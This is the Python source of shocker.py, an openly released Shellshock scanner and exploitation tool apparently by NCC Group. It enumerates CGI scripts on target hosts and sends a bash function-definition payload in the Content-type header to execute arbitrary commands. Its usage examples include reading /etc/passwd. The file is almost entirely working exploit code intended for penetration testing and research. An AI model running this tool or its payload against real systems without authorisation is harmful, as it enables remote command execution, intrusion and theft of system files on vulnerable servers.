#!/usr/bin/python

"""
shocker.py v0.6
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.com                           #
#                                                                            #
# http://www.github.com/nccgroup/shocker                                     #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (http://www.gnu.org/licenses/agpl-3.0.html)                                #
##############################################################################

Usage examples:
./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
/etc/passwd

./shocker.py -H www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

./shocker.py -f iplist
Scans all hosts specified in the file ./iplist with default options

Read the README for more details
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading
import re

# User-agent to use instead of 'Python-urllib/2.6' or similar
user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """

    sys.exit(0)

def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """

    confirmed_hosts = [] # List of resoveable and reachable hosts
    print "[+] Checking setup..."
    for host in host_target_list:
        try:
            if verbose: print "[I] Checking to see if %s resolves..." % host
            ipaddr = socket.gethostbyname(host)
            if verbose: print "[I] Resolved ok"
            if verbose: print "[I] Checking to see if %s is reachable on post %s..." % (host, port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print "[I] %s seems reachable..." % host
            confirmed_hosts.append(host)
        except Exception as e:
            print "[!] Exception - %s: %s" % (host, e)
            print "[!] Omitting %s from target list..." % host
    print "[+] Good to go!"
    return confirmed_hosts

def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check. 
    """

    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_index = 0
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []
    
    for host in host_target_list:
        print "[+] Starting host scan for %s on port %s" % (host, port) 
        print "[+] Looking for CGIs..."
        for cgi in cgi_list:
            cgi_index += 1
            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")    
                
                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", user_agent)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)
                
                thread_pool.acquire()
                
                # Start a thread for each CGI in cgi_list
                if verbose: print "[I] Starting thread %i" % cgi_index
                t = threading.Thread(target = check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e: 
                if verbose: print "[I] %s - %s" % (url, e) 
            finally:
                pass

        # Wait for all the threads to finish before moving on    
        for thread in threads:
            thread.join()
    
        # Pop any results from the Queue and add them to the list of potentially 
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())
    print "[+] Finished host scan"
    return exploit_targets

def check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """

    try:
        if urllib2.urlopen(req, None, 5).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
    finally:
        thread_pool.release()

def exploit_cgi(proxy, target_list, exploit, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """

    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # Dictionary of header:attack string to try against discovered CGI scripts
    attack_strings = {
       "Content-type": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
       }
    # A list of apparently successfully exploited targets returned to main() 
    successful_targets = []

    if len(target_list) > 1:
        print "[+] %i potential targets found" % len(target_list)
    else:
        print "[+] 1 potential target found"
    print "[+] Attempting exploits..."
    for target in target_list:
        print "[+] Trying exploit for %s" % target 
        host = target.split(":")[1][2:] # substring host from target URL
        for header, attack in attack_strings.iteritems():
            try:
                if verbose:
                    print "  [I] Header is: %s" % header
                    print "  [I] Attack string is: %s" % attack
                    print "  [I] Flag set to: %s" % success_flag
                req = urllib2.Request(target)
                req.add_header(header, attack)
                if proxy:
                    req.set_proxy(proxy, "http")    
                    if verbose: print "  [I] Proxy set to: %s" % str(proxy)
                req.add_header("User-Agent", user_agent)
                req.add_header("Host", host)
                resp = urllib2.urlopen(req)
                result =  resp.read()
                if success_flag in result:
                    print "  [!] %s looks vulnerable" % target 
                    print "  [!] Response returned was:" 
                    buf = StringIO.StringIO(result)
                    for line in buf:
                        if line.strip() != success_flag: 
                            print "  %s" % line.strip()
                    buf.close()
                    successful_targets.append(target)
                else:
                    print "[-] Not vulnerable" 
            except Exception as e:
                if verbose: print "[I] Exception - %s - %s" % (target, e) 
            finally:
                pass
    return successful_targets


def ask_for_console(successful_targets):
    # Initialise to non zero to enter while loop
    user_input = 1
    
    print "[+] The following URLs appeared to be exploitable:"
    for x in range(len(successful_targets)):
        print "[%i] %s" % (x, successful_targets[x-1])
    while user_input:
        user_input = raw_input("[?] Enter an URL number or 0 to exit: ")
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print "[-] Please enter a number between 0 and %i" % len(successful_targets)
            continue
        elif not user_input:
            continue
        print "[+] Alrighty then..."

def validate_address(hostaddress):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """

    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True 
    else:
        print "Host %s appears invalid, exiting..." % hostaddress
        exit(0)


def get_targets_from_file(file_name):
    """ Import targets to scan from file
    """

    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line):
                host_target_list.append(line)
    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """

    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
    return cgi_list


def main():
    print """
   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v0.6 
   
 Tom Watson, tom.watson@nccgroup.com
 http://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (http://www.gnu.org/licenses/agpl-3.0.html)
    
    """ 
    
    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the README' 
        )
    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument(
        '--Hostname',
        '-H',
        type = str,
        help = 'A target host'
        )
    targets.add_argument(
        '--file',
	'-f',
        type = str,
        help = 'File containing a list of targets'
        )
    cgis = parser.add_mutually_exclusive_group()
    cgis.add_argument(
        '--cgilist',
        type = str,
        default = './shocker-cgi_list',
        help = 'File containing a list of CGIs to try'
        )
    cgis.add_argument(
        '--cgi',
        '-c',
        type = str,
        help = "Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--port',
        '-p',
        default = 80,
        type = int, 
        help = 'The target port number (default=80)'
        )
    parser.add_argument(
        '--exploit',
        '-e',
        default = "/bin/uname -a",
        help = "Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--proxy', 
        help = "*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action = "store_true", 
        default = False,
        help = "Use SSL (default=False)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type = int,
        default = 10,
        help = "Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action = "store_true", 
        default = False,
        help = "Be verbose in output"
        )
    args = parser.parse_args()

    # Assign options to variables
    if args.Hostname:
        host_target_list = [args.Hostname]
    else:
        host_target_list = get_targets_from_file(args.file)
    if not len(host_target_list) > 0:
        print "[-] No valid targets provided, exiting..."
        exit (0)
    port = str(args.port)
    if args.proxy is not None:
        proxy = args.proxy
    else:
        proxy = ""
    verbose = args.verbose
    exploit = args.exploit
    if args.ssl == True or port == "443":
        protocol = "https"
    else:
        protocol = "http"
    global thread_pool
    if args.threads > 100:
        print "Maximum number of threads is 100"
        exit(0) 
    else:
        thread_pool = threading.BoundedSemaphore(args.threads)
    if args.cgi is not None:
        cgi_list = [args.cgi]
        print "[+] Single target '%s' being used" % cgi_list[0]
    else:
        cgi_list = import_cgi_list_from_file(args.cgilist)

    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)

    # If any cgi scripts were found on the target host try to exploit them
    if len(target_list):
        successful_targets = exploit_cgi(proxy, target_list, exploit, verbose)
        if len(successful_targets):
            ask_for_console(successful_targets)
    else:
        print "[+] No potential targets found :("
    print "[+] The end"

if __name__ == '__main__':
    main()
